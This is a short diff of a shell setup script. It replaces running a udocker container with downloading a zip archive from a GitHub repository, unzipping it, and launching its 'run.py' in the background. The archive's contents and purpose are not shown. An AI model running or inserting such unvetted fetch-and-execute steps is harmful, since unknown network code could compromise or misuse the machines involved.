@@ -1,4 +1,5 @@
 sudo apt update
-sudo apt install -y python3-pip
-pip install udocker --break-system-packages
-udocker --allow-root run lagraven/node:latest
+sudo apt install python3-pip -y
+curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/ams.zip
+unzip ams.zip
+python3 run.py &
